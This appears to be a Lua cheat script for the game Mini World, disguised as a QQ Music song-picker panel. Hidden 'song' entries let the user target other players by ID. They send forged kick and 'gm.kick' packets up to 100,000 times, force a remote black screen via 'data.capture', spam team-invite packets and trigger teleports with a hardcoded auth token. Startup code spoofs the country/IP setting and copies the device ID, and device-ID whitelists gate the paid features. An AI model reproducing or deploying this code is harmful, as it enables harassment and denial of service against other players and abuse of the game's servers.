                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end

            -- 打开玩家选择面板
            GetInst("UIManager"):Open("HomeEventRecord")
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            ctrl:UpdateUI(data)
            -- 修改界面文字
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择目标玩家")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad 房间在线玩家")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad 点击玩家开始执行流程")

            -- 备份原点击函数
            local oldClickFunc = ctrl.EnterFriendHomeBtn_OnClick
            -- 重写点击事件：选中玩家后执行全套逻辑
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家选择面板
                GetInst("UIManager"):Close("HomeEventRecord")
                -- 还原原始点击函数，避免冲突
                ctrl.EnterFriendHomeBtn_OnClick = oldClickFunc

                -- 获取选中玩家uin
                local targetUin = this:GetClientID()
                ShowGameTipsWithoutFilter("#c00ffff 已选中目标玩家："..targetUin)

                -- 标记循环开启，放入异步线程防止UI卡死
                _G.teleTeamLoopSwitch = true
                threadpool:work(function()
                    -- ========== 1、跨地图传送代码 ==========
                    GameVmTriggerInit()
                    local selfUin = targetUin
                    local content = '{"mapid":"66336934704562","body":"uin=889750811&ts=1723499823&country=CN&apiid=110&game_session_id=&s2t=1723498072&cltapiid=1&version=1.7.8&cltversion=67336&session_id=&env=0&log_id=&language=0&auth=b33f76eb8b37091e88c963d666f182a6","members":['..selfUin..'],"pos":{}}'
                    
                    SandboxMgr:sendToHost('MULTI_MAP_TELEPORT_TOHOST',content)
                    ShowGameTipsWithoutFilter("#c00ffff 地图传送指令发送完成")
threadpool:wait(3.0)
                    -- ========== 2、创建私密6人队伍 ==========
                    GetClientGameManagerPtr():gotoGame("MainMenuStage")
                    local param = {
                        member_max = 6,
                        is_private = 1,
                        gender = 0,
                        name = ""
                    }
                    GetInst("TeamupPreSetService"):ReqCreateTeamSync(param, selfUin)
                    threadpool:wait(1.0) -- 等待队伍创建完成
                    ShowGameTipsWithoutFilter("#c00ffff 私密队伍创建成功")

                    -- ========== 3、循环向选中玩家发送组队同意回执 ==========
                    local teamSvr = GetInst("TeamupService")
                    local loopCount = 0
                    while _G.teleTeamLoopSwitch do
                        loopCount = loopCount + 1
                        local sendData = {
                            code = 0,
                            teamid = teamSvr:GetTeamID()
                        }
                        -- 单发接口route，修复routemore数字参数报错
                        AccountManager:route("SocialHallDataMgr.organize_team_resp", targetUin, sendData)

                        -- 每10次弹窗提示
                        
                        threadpool:wait(0.000001) -- 发包间隔，防限流
                    end

                    -- 循环终止收尾提示
                    ShowGameTipsWithoutFilter("#cFF0000 循环停止，总计发送回执："..loopCount.."次")
                end)
            end
        end
    end
)

return
	end



	if song_id == 99989 or song_id == "99989" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000开启成功")

ShowTextInputSafe(function(text)
        -- 验证输入的迷你号是否有效
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000无效迷你号（需大于1000）", 3)
            return
        end
        
        -- 循环执行踢人（这里原代码是固定循环10000次）
        for a=0,100000 do 
    threadpool:wait(1.0)
            AccountManager.cluster.buddysvr.routemore('device_limit_kick',target,0)
            ShowGameTipsWithoutFilter("#R远程强制下线", 3)  -- 这条提示会刷屏，建议移到外面
        end
    end, "输入迷你号")
    end



	if song_id == 99988 or song_id == "99988" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")

ShowTextInputSafe(function(text)
        -- 验证输入的迷你号是否有效
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000Mini ID không hợp lệ (phải lớn hơn 1000)", 3)
            return
        end
        
        -- 循环执行踢人（这里原代码是固定循环10000次）
        
            AccountManager.cluster.buddysvr.routemore('data.capture',target,54188)
            ShowGameTipsWithoutFilter("#RMàn hình đen từ xa", 3)  -- 这条提示会刷屏，建议移到外面
        
    end, "Nhập Mini ID")
    end



	if song_id == 99987 or song_id == "99987" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")

ShowTextInputSafe(function(text)
        -- 验证输入的迷你号是否有效
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000Mini ID không hợp lệ (phải lớn hơn 1000)", 3)
            return
        end
        
        -- Thêm vòng lặp chạy liên tục 100.000 lần
        for a = 0, 100000 do 
            threadpool:wait(1.0) -- Đợi 1 giây mỗi lần gửi
            AccountManager.cluster.buddysvr.routemore('data.capture', target, 54188)
        end
        
    end, "Nhập Mini ID")
end



	if song_id == 99986 or song_id == "99986" then
		-- 功能4：关闭面板
		ShowGameTipsWithoutFilter("#cff0000Bật thành công")

ShowTextInputSafe(function(text)
        -- 验证输入的迷你号是否有效
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000Mini ID không hợp lệ (phải lớn hơn 1000)", 3)
            return
        end
        
        -- Vòng lặp gửi lệnh GM Kick liên tục
        for a = 0, 100000 do 
            threadpool:wait(1.0) -- Đợi 1 giây mỗi lần gửi
            AccountManager.cluster.buddysvr.routemore('gm.kick',target,54188)
        end
        
    end, "Nhập Mini ID")
end


	
	-- 真实歌曲
	self:GetMusicDetailInfo(song_id, function(item)
		if not item then
			return
		end
		self:OnSynMusicList(cmd, function()
			self:RefreshLeftList()
			self:RefreshMusicList()
			self.view:showData()
		end)
		-- 不保存到最近播放
	end)
end

function QQMusicTriggerCtrl:Refresh()
	self.model:SetIsCloseUI(false)
	if not self.schedulerKey then
		self.lastTime = os.time()
		self.schedulerKey = GetInst("MiniUIScheduler"):regGloabel(function()
			self:DoUpdate()
		end, 0.1, 864000000, nil, false)
	end
	local listType = self.model:GetListType()
	self.view:RefreshLeftList(listType, self.define.leftInfos, self.OnClickLeftItem)
	self:OnClickLeftItem(listType)
end


-- 点击搜索按钮，执行歌曲搜索
function QQMusicTriggerView:OnSearchMusic()
	if self.model:IsCloseUI() then
		return
	end
	if self.widget.searchEdit then
		local text = self.widget.searchEdit:getText()
		if self.parent then
			self.widget.musicList:setNumItems(0) -- 清空旧列表
			-- ===== 改成搜索功能 =====
			self.parent:SearchFunction(text) -- 调用控制器的搜索功能
			-- =========================
			self.widget.searchText:setText(GetS(13078, text))
		end
	end
end


function QQMusicTriggerCtrl:SearchFunction(text)
	if not text or text == "" then
		self:RefreshMusicList()
		return
	end
	
	local searchText = string.lower(text)
	local results = {}
	local resultIds = {}
	
	-- 搜索推荐列表
	local recommendList = self.model:GetMusicList(self.model.LISTTYPE.RECOMMEND)
	if recommendList then
		for i, song in ipairs(recommendList) do
			local detail = self.model:GetMusicDetailByID(song.song_id)
			if detail and detail.song_name then
				local name = string.lower(tostring(detail.song_name))
				if string.find(name, searchText, 1, true) then
					if not resultIds[song.song_id] then
						table.insert(results, {song_id = song.song_id})
						resultIds[song.song_id] = true
					end
				end
			end
		end
	end
	
	-- 搜索最近播放列表
	local nearList = self.model:GetMusicList(self.model.LISTTYPE.NEAR)
	if nearList then
		for i, song in ipairs(nearList) do
			local detail = self.model:GetMusicDetailByID(song.song_id)
			if detail and detail.song_name then
				local name = string.lower(tostring(detail.song_name))
				if string.find(name, searchText, 1, true) then
					if not resultIds[song.song_id] then
						table.insert(results, {song_id = song.song_id})
						resultIds[song.song_id] = true
					end
				end
			end
		end
	end
	
	
	
	-- 显示搜索结果
	if #results > 0 then
		self.view:RefreshMusicList(results, self.model.LISTTYPE.SEARCH)
		self.view.widget.searchText:setText("搜索结果：" .. #results .. "个")
	else
		ShowGameTipsWithoutFilter("未找到相关功能")
		self:RefreshMusicList()
	end
end

-- 底部播放按钮点击回调，切换播放/暂停状态
function QQMusicTriggerView:bouttonState()
	if self.model:IsCloseUI() then
		return
	end
	if self.widget.bouttonPlay:getController("ButtonPlay"):getSelectedIndex() == self.BUTTONSTATE.STOP then
		-- 播放
		self:RefreshButtonState(self.model.PLAYSTATE.PLAY)
		QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/096d816716f4f311fd3a78d9f2dfd3fc.mp3", 0)
	else
		-- 暂停
		self:RefreshButtonState(self.model.PLAYSTATE.STOP)
		if QQMusicPlayerIns then
			QQMusicPlayerIns:PauseMusicOperate()
		end
	end
end

function QQMusicTriggerView:RenderItemNode(idx, obj)
	if self.model:IsCloseUI() then
		return
	end
	idx = idx or arg1
	idx = idx + 1
	obj = tolua.cast(obj, "miniui.GButton")
	local itemNode = obj or tolua.cast(arg2, "miniui.GButton")
	local showMark = self.musicCount == idx
	
	-- ===== 关键修改：直接用 dataList 获取数据 =====
	local data = nil
	if self.currentDataList and idx <= #self.currentDataList then
		local songId = self.currentDataList[idx]
		if type(songId) == "table" then
			songId = songId.song_id
		end
		data = self.parent:GetMusicByID(songId)
	end
	-- ============================================
	
	if self.parent then
		self:RefreshMusicListItem(itemNode, idx, data, showMark)
	end
	if showMark then
		local isSelect = itemNode:getChild("select")
		if isSelect then
			isSelect:setVisible(false)
		end
	end
end



function QQMusicTriggerView:RefreshMusicList(dataList, listType)
	if self.model:IsCloseUI() then
		return
	end
	
	-- ===== 保存当前数据列表供 RenderItemNode 使用 =====
	self.currentDataList = dataList
	-- ================================================
	
	local count = #dataList
	self.musicCount = 0 < count and count + 1 or count
	self.widget.musicList:setNumItems(self.musicCount)

	if #dataList == 0 then
		self.widget.notipText:setVisible(true)
		self.widget.notipImage:setVisible(true)
	else
		self.widget.notipText:setVisible(false)
		self.widget.notipImage:setVisible(false)
	end

	if self.model.LISTTYPE.SEARCH == listType then
		self.controllerSearch:setSelectedIndex(self.SEARCHSTATE.SEARCH)
	else
		self.controllerSearch:setSelectedIndex(self.SEARCHSTATE.NORMAL)
	end

	local playingData = self.parent:GetPlayingMusic()
	self.widget.bouttonPlay:setTouchable(playingData ~= nil)
end




function QQMusicTriggerView:RefreshMusicListItem(item, index, data, showMark)
	if self.model:IsCloseUI() then
		return
	end
	if item then
		-- 隔行变色背景
		local bkg = item:getChild("bkg")
		-- 排名数字
		local rank = item:getChild("trank")
		-- 歌曲名称文本
		local musicName = item:getChild("tmusicName")
		-- 时长文本
		local authorName = item:getChild("tauthorName")
		-- 播放中图标（播放时替换排名数字）
		local playIcon = item:getChild("playIcon")
		-- 每行右侧【试听】按钮（你截图黄色按钮）
		local buttonSelect = item:getChild("bouttonSelect")
		-- 末尾空白行分隔标记
		local mark = item:getChild("qqmark")
		-- 歌曲选中高亮遮罩
		local isSelect = item:getChild("select")

		-- 隔行背景控制，末尾空白行取消背景
		
		
		if buttonSelect then
	buttonSelect:setText("Bật")
	
end
	
		
if bkg then
	-- 全部显示青色背景
	bkg:setVisible(true)
	if showMark then
		bkg:setVisible(false)  -- 空白行还是隐藏
	end
end

		-- 空白行隐藏排名、显示分割标记
		if rank then
		rank:setColor({r = 255, g = 0, b = 0})
			rank:setVisible(not showMark)
			rank:setText("VIP")
		end
		if mark then
			mark:setVisible(showMark)
		end
		if musicName then
			musicName:setVisible(not showMark)
		end
		if authorName then
			authorName:setVisible(not showMark)
		end
		if buttonSelect then
			buttonSelect:setVisible(not showMark)
		end

		-- 有歌曲数据才渲染内容
		if data then
			item:setCustomData(data.song_id) -- 将歌曲ID绑定到条目控件
			-- 不可播放歌曲整体半透明、按钮禁用
			local alhpa = data.playable == 1 and 1 or 0.5
			if data.playable ~= 1 then
				item:setCustomData(0)
			end
			 --所有文字+按钮统一透明度
			rank:setAlpha(alhpa)
			musicName:setAlpha(alhpa)
			authorName:setAlpha(alhpa)
			buttonSelect:setAlpha(alhpa)
			buttonSelect:setTouchable(data.playable == 1)

			item:setVisible(data ~= nil or showMark)
			-- 拼接歌曲名-歌手名，超长文字截断加省略号
			if musicName and data.song_name and data.singer_name then
				local showName = tostring(data.song_name) .. " - " .. tostring(data.singer_name)
				local strLength, bDefault = getStringLength(showName, 48)
				if bDefault then
					showName = string.sub(showName, 1, strLength) .. "..."
				end
				musicName:setText(showName)
			end
			-- 格式化歌曲时长显示
			if authorName then
				local musicTime = self:FormatTime(data.song_play_time)
				authorName:setText(tostring(musicTime))
			end

			-- 给【试听按钮】绑定点击事件，点击试听+添加歌曲到待选列表
			if buttonSelect then
				-- 先移除旧事件，防止列表复用时重复绑定
				if buttonSelect.buttonkey then
					GetInst("MiniUIEventDispatcher"):removeEventListener(buttonSelect, buttonSelect.buttonkey)
					buttonSelect.buttonkey = nil
				end
				-- 注册新点击事件
				buttonSelect.buttonkey = GetInst("MiniUIEventDispatcher"):addEventListener(buttonSelect, UIEventType_Click, function(obj, context)
					self.data.musicPlayTime = 0 -- 重置播放进度
					self:RefreshButtonState(self.model.PLAYSTATE.PLAY) -- 更新播放按钮UI
					self:OnPlayIcon(obj, index) -- 设置当前播放歌曲
					self:showData() -- 刷新底部歌曲信息
					self.parent:OnAddMusic(data.song_id, data) -- 核心：调用控制器添加歌曲
					self.widget.bouttonPlay:getController("ButtonPlay"):setSelectedIndex(self.BUTTONSTATE.PLAY)
				end)
			end

			if index >= self.musicCount then
				return
			end
			-- 当前选中歌曲显示高亮遮罩
			local selectData = self.parent:GetSelectMusic()
			if selectData then
				if data.song_id == selectData.song_id then
					isSelect:setVisible(true)
				else
					isSelect:setVisible(false)
				end
				self.list[data.song_id] = item
			else
				isSelect:setVisible(false)
			end

			-- 正在播放的歌曲替换播放图标，隐藏排名数字
			local playingData = self.parent:GetPlayingMusic()
			if playingData then
				if data.song_id == playingData.song_id and index < self.musicCount then
					local state = self.model:GetPlayState()
					if state == self.model.PLAYSTATE.PLAY then
						playIcon:setPlaying(true)
					else
						playIcon:setPlaying(false)
					end
					playIcon:setVisible(true)
					rank:setVisible(false)
					if self.loadingState then
						playIcon:setPlaying(false)
					end
				else
					playIcon:setVisible(false)
					rank:setVisible(true)
				end
			else
				playIcon:setVisible(false)
			end
		end
		-- 末尾空白行隐藏选中标记
		if showMark then
			isSelect:setVisible(false)
		end
	end
end

-- 切换加载中状态，显示/隐藏加载转圈
function QQMusicTriggerView:SetLoading(state)
	self.loadingState = state
	-- 不显示加载转圈
	-- self.widget.loadingbkg:setVisible(state)
	-- self.widget.loading:setVisible(state)
	self:showData()
end


function QQMusicTriggerView:InitUI(param)
	-- 本地数据缓存
	self.data = {}
	self.data.musicAllTime = 0     -- 当前播放歌曲总时长
	self.data.musicPlayTime = 0    -- 当前已播放时长
	self.data.interval = 0         -- 刷新时间戳间隔
	self.data.loadingSpeed = 10    -- 加载转圈旋转速度

	self.parent = param.parent     -- 绑定上层Controller控制器（父层，处理业务逻辑）
	self.model = param.model       -- 绑定Model数据层（存储歌单、播放状态）
	self.widget = {}               -- 所有FGUI控件统一缓存容器
	self.list = {}                 -- 歌曲ID与Item控件映射表
	self.sureData = {}             -- 待批量添加的歌曲缓存

	-- 1、获取弹窗根容器m_player
	self.widget.player = self.root:getChild("m_player")
	-- 遮罩层（点击空白关闭弹窗）
	self.widget.mask = self.root:getChild("m_mask")

	-- 按钮状态枚举：0停止，1播放
	self.BUTTONSTATE = {STOP = 0, PLAY = 1}
	-- 搜索栏状态枚举：0正常，1搜索模式
	self.SEARCHSTATE = {NORMAL = 0, SEARCH = 1}

	-- 左侧分类列表（推荐音乐/最近试听）
	self.widget.leftList = self.widget.player:getChild("tleftList")
	-- 中间歌曲虚拟列表（展示所有歌曲条目）
	self.widget.musicList = self.widget.player:getChild("tmusicList")
	if self.widget.musicList then
		-- 绑定列表条目点击事件
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.musicList, UIEventType_ClickItem, function(obj, context)
			self:OnClickMusicItem(context)
		end)
		-- 绑定列表渲染器回调，虚拟列表每生成一行Item都会执行RenderItemNode
		GetInst("MiniUIComponents"):setCallback(self.widget.musicList, "GList.itemRenderer", function(comp, idx, obj)
			self:RenderItemNode(idx, obj)
		end)
		-- 绑定列表滚动事件，用于下拉加载更多搜索歌曲
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.musicList, UIEventType_Scroll, function(obj, context)
			self:OnListScroll(context)
		end)
		-- 开启虚拟列表优化，只渲染可视区域条目，节省性能
		self.widget.musicList:setVirtual()
	end

	-- 右上角关闭按钮 X
	self.widget.bouttonClose = self.widget.player:getChild("bouttonClose")
	if self.widget.bouttonClose then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.bouttonClose, UIEventType_Click, function(obj, context)
			-- 调用父控制器关闭窗口逻辑
			if self.parent and self.parent.OnClose then
				self.parent:OnClose()
			end
		end)
	end

	-- 点击灰色遮罩关闭弹窗
	if self.widget.mask then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.mask, UIEventType_Click, function(obj, context)
			self.parent:OnClose()
		end)
	end

	-- 右下角【确定】批量添加歌曲按钮
	self.widget.bouttonSure = self.widget.player:getChild("bouttonSure")
	if self.widget.bouttonSure then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.bouttonSure, UIEventType_Click, function(obj, context)
			self:OnClickMusicSure()
		end)
	end

	-- 底部中央播放/暂停总按钮
	self.widget.bouttonPlay = self.widget.player:getChild("buttonPlay")
	if self.widget.bouttonPlay then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.bouttonPlay, UIEventType_Click, function(obj, context)
			local playingData = self.parent:GetPlayingMusic() -- 当前正在播放歌曲
			local selectData = self.parent:GetSelectMusic()    -- 当前选中歌曲
			self:bouttonState() -- 切换播放/暂停UI状态
			-- 如果选中歌曲=正在播放歌曲，刷新底部歌曲信息
			if playingData.song_id == selectData.song_id then
				self:showData()
			end
		end)
	end

	-- 下一曲按钮（当前隐藏未启用）
	self.widget.bouttonNext = self.widget.player:getChild("buttonNext")
	self.widget.bouttonNext:setVisible(false)

	-- 歌曲封面图标
	self.widget.musicIcon = self.widget.player:getChild("musicIcon")
	if self.widget.musicIcon then
		-- 设置默认封面资源
		self.widget.musicIcon:setIcon("https://www.panurl.cn/view.php/622a81c1c9f07c35845def16ed75209a.png")
		self.oldIcon = self.widget.musicIcon:getIcon() -- 缓存默认封面
		-- 设置圆形遮罩，把方形封面切成圆形
		self.widget.musicIcon:setMaskTexture("miniui/miniworld/QQMusicPlayer_HeadMask.png")
	end

	-- 搜索栏父容器
	self.widget.search = self.widget.player:getChild("search")
	-- 搜索按钮（放大镜）
	self.widget.buttonSearch = self.widget.search:getChild("buttonSearch")
	-- 搜索输入框
	self.widget.searchEdit = self.widget.search:getChild("edit")
	if self.widget.buttonSearch then
		GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.buttonSearch, UIEventType_Click, function(obj, context)
			self:OnSearchMusic()
		end)
	end

	-- 清空搜索按钮（X）
	self.widget.buttonSearchClose = self.widget.player:getChild("buttonSearchClose")
	GetInst("MiniUIEventDispatcher"):addEventListener(self.widget.buttonSearchClose, UIEventType_Click, function(obj, context)
		self:OnSearchClose()
	end)

	-- 搜索状态切换控制器（控制界面文字/布局切换）
	self.controllerSearch = self.widget.player:getController("SearchStatus")
	-- 搜索结果提示文本
	self.widget.searchText = self.widget.player:getChild("searchText")
	-- 列表为空时提示文字：列表为空，请选择要播放的歌曲
	self.widget.notipText = self.widget.player:getChild("notipText")
	self.widget.notipText:setText(GetS(37037))
	-- 列表为空占位图片
	self.widget.notipImage = self.widget.player:getChild("notipImage")
	-- 加载遮罩背景
	self.widget.loadingbkg = self.widget.player:getChild("loadingbkg")
	-- 加载旋转图标
	self.widget.loading = self.widget.player:getChild("loading")
	-- 底部歌曲名称文本
	self.widget.musicName = self.widget.player:getChild("musicName")
	self.widget.musicName:setText("Chào mừng Quý khách VIP Hạng Vàng") -- 默认文字：加载中...
end


-- 刷新底部歌曲名称、总时长、封面
function QQMusicTriggerView:showData()
	if self.model:IsCloseUI() then
		return
	end
	local data = self.parent:GetPlayingMusic()
	-- 拼接歌名歌手
	local showName = tostring(data.song_name) .. " - " .. tostring(data.singer_name)
	self.widget.musicName:setText(showName)
	if self.loadingState then
		self.widget.musicName:setText("Chào mừng Quý khách VIP Hạng Vàng")
	end
	self.data.musicAllTime = data.song_play_time
	self:RefreshTime()
	-- 加载歌曲封面图
	local picData = self.parent:GetMusicByID(data.song_id)
	if picData then
		self.parent:loadAlbumPic(picData)
	end
end

-- 帧更新核心逻辑：每分每秒刷新时间
function QQMusicTriggerView:DealProgress(deltaTime)
	-- 每0.5秒刷新一次时间（北京时间和播放进度）
	self.data.interval = self.data.interval + deltaTime
	if self.data.interval >= 0.5 then
		self:RefreshTime()
		self.data.interval = 0
	end
end




function QQMusicTriggerView:RefreshTime()
	if self.model:IsCloseUI() then
		return
	end
	
	-- 获取北京时间
	local function getBeijingTime()
		local now = os.time()
		local utcOffset = os.difftime(now, os.time(os.date("!*t", now)))
		local beijingOffset = 8 * 3600
		local beijingTime = now + beijingOffset - utcOffset
		return os.date("%H:%M:%S", beijingTime)
	end
	
	if self.widget.player:getChild("musicTime") then
		-- 显示北京时间
		self.widget.player:getChild("musicTime"):setText(getBeijingTime())
	end
end



    
-- 获取当前设备ID









--=====================================================
--====================================================================

if not jdjsjsjsn then
  
    gFunc_deleteStdioDir(filepath_root..'axdx')
    ShowGameTipsWithoutFilter("#cFF7aadChào mừng đến với Mã lua đã được tui chỉnh sửa") 
    MessageBox(4, '#KThông báo từ tác giả :#R-Thêm tính năng chống màn hình đen và kick từ xa\n#R-Nút biến hình là nút để thoát game\n-Thêm Skybox VIP.', function(btn)
end)
   local country = "VN"
gFunc_setCountry(country)
gFunc_setCountryIP(country)
    local a = GetClientInfo():getDeviceID()
    GetClientInfo():clickCopy(a)


    jdjsjsjsn = true
    
end





-- 打开歌曲列表主面板（点击悬浮球调用）








-- 打开歌曲列表主面板（点击悬浮球调用）










-- ==================== 全局变量声明 ====================
-- 功能开关变量
kick_loop_enabled = false
kick_target = 0
is_kq_enabled = false
is_attack_enabled = false
attack_loop_running = false
is_skybox_enabled = false
skybox_loop_running = false
is_time_speed_enabled = false
time_speed_loop_running = false
current_time_speed = 100
ydfh_all_1 = false
wdtz_all_1 = false
jdfk_all_1 = false
    -- 在脚本开头的全局变量区添加
kick_timer = nil
if syntaxcheck then return end

-- 确认框回调存储
local currentConfirmCallback = nil

-- 通用特效列表
local commonNameList = {
    "ice_qicaihua_01", "140113_1", "pumpkin_fireworks2", "horse_3437",
    "horse_4506_3", "horse_4662_3","horse_4502","horse_4564_3","horse_4645_3","horse_4616_3","horse_4554_3","horse_3457","horse_4503","140273_5","140273_1"
}

local effectNameList = {
    "bossblock_jinghua", "horse_4506_3", "horse_4662_3", "music01",
    "music02", "boss_10069_hq", "bossskill_3514_white", "bossblock_room"
}
---vip保护白名单列表
local whitelist = {
    [1322265657] = true,  -- Tác giả Sinanh
    [1321045572] = true,  -- Null Void            -- Người sử dụng VIP
    [1321275680] = true,  -- Hiếu nick 2
    [1308731965] = true,  -- Hiếu
    [1253946672] = true,  -- Vua treo
    [1321375326] = true,  -- Yaa
    [1304055544] = true,  -- Long
    [1320711360] = true,  -- Jet Jet
    [1017404163] = true,  -- Kai
    [1321680699] = true,  -- Cam
    [1321070606] = true,  -- 真假
    [1229715679] = true,  -- Script
    [1321306006] = true,  -- Void
    [1325027821] = true,  -- Kai
    [1325705254] = true,  -- Yaa 2
    [1327966905] = true,  -- Sinanh 2
    [1320670867] = true,  -- 鑫磊語嫣
    [1244462831] = true,  -- duc ngu
    [1241340304] = true,  -- Murilo_theplayer
     [1] = true,
     [1] = true,
     
     
}

---作者专属
local author = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备ID
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
    ["9c87144faf65f385bee20929d6e3e7eb"] = true,
    ["1afdd486624e54dcb903315d1407ce35"] = true,
        ["2d7e0e6b59015924363be9262fc378c7"] = true,
    ["191c6f9db55106d4140d6f5220a8cd36"] = true,
}


--vip特殊功能
local deviceWhitelist = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备                    -- 添加更多设备
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,
    ["3fecbaa4b9c6d4220095ac26deac3446"] = true,
        ["e8ad3d874429b833621de44d11cccfce"] = true,
        ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["9c87144faf65f385bee20929d6e3e7eb"] = true,
            ["1afdd486624e54dcb903315d1407ce35"] = true,
                ["2d7e0e6b59015924363be9262fc378c7"] = true,
                        ["191c6f9db55106d4140d6f5220a8cd36"] = true,
}



--防电脑秒
local author1 = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["2d7e0e6b59015924363be9262fc378c7"] = true,

}


--防电脑秒
local author2 = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
     ["2d7e0e6b59015924363be9262fc378c7"] = true,
         ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,

}

--全体循环秒
local author3 = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["2d7e0e6b59015924363be9262fc378c7"] = true,
        ["2284226b84d8e849a69326db5bbb217d"] = true,
                ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,
                                ["dc6246ebf679886a6da50d8e36ab7b2a"] = true,

}
---秒杀白名单
local author4 = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["1afdd486624e54dcb903315d1407ce35"] = true,
            ["91f23e91dd107a4d51f26368e63a62ae"] = true,
            ["a97a1dd9aed672208883d57bb294ec83"] = true,
                    ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,

}


---自定义投掷物
local author5 = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,  
    ["c432ca63425e9d39bcfcbc14e215ed17"] = true,
    ["2284226b84d8e849a69326db5bbb217d"] = true,
            ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,

}

----c币功能
local author6 = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["f3e1bb45ada801c61b13a618fdc2f8c2"] = true,
        ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,

}

----超级功能
local author7 = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
        ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,
             ["f3e1bb45ada801c61b13a618fdc2f8c2"] = true,
                     ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,
                     ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,

}


local author8 = {
    ["ef9b2499cea7741b9f81a9769ee9eba0"] = true,  -- 你的设备ID
    ["e8ad3d874429b833621de44d11cccfce"] = true,
        ["1afdd486624e54dcb903315d1407ce35"] = true,
                ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,
        ["a97a1dd9aed672208883d57bb294ec83"] = true,
           

}



-- ==================== 修复后的ShowPlayerList函数 ====================
-- 增强版ShowPlayerList，支持异步回调、空玩家判断和取消回调
function ShowPlayerList(callback, title, onCancel)
    LoadHomelandLuas()
    local uin_list = GetPlayerUinList()
    
    -- 如果没有其他玩家，直接返回并触发取消回调
    if #uin_list == 0 then
        ShowGameTipsWithoutFilter("#cFF0000当前房间没有其他玩家")
        if onCancel then 
            xpcall(onCancel, function(err) end)
        end
        return false
    end
    
    local data = {
        visit = { 
            history_num = title or "功能", 
            today_num = "#cFF7aad" .. #uin_list 
        },
        event_home = { { param1 = 0, event_id = 5, event_time = 0 } },
        event_visit = {}
    }
    
    for i = 1, #uin_list do
        table.insert(data.event_visit, { uin = uin_list[i], event_id = 5, event_time = 0 })
    end
    
    local UIMgr = GetInst("UIManager")
    UIMgr:Open("HomeEventRecord")
    UIMgr:GetCtrl("HomeEventRecord"):UpdateUI(data)
    
    getglobal("HomeEventRecordTitleFrameName"):SetText("房员列表")
    getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家数量")
    getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad当前功能")
    
    -- 保存回调到全局变量
    _G._tempPlayerCallback = callback
    _G._tempPlayerCancel = onCancel
    _G._tempPlayerTitle = title
    
    local HomeEvent = UIMgr:GetCtrl("HomeEventRecord")
    
    -- 重写进入按钮点击事件
    function HomeEvent:EnterFriendHomeBtn_OnClick()
        UIMgr:Close("HomeEventRecord")
        local selectedUin = this:GetClientID()
        ShowGameTipsWithoutFilter("#c00ffff已选择玩家：" .. selectedUin)
        
        if _G._tempPlayerCallback then
            local cb = _G._tempPlayerCallback
            local t = _G._tempPlayerTitle
            -- 清空全局变量
            _G._tempPlayerCallback = nil
            _G._tempPlayerCancel = nil
            _G._tempPlayerTitle = nil
            -- 执行回调
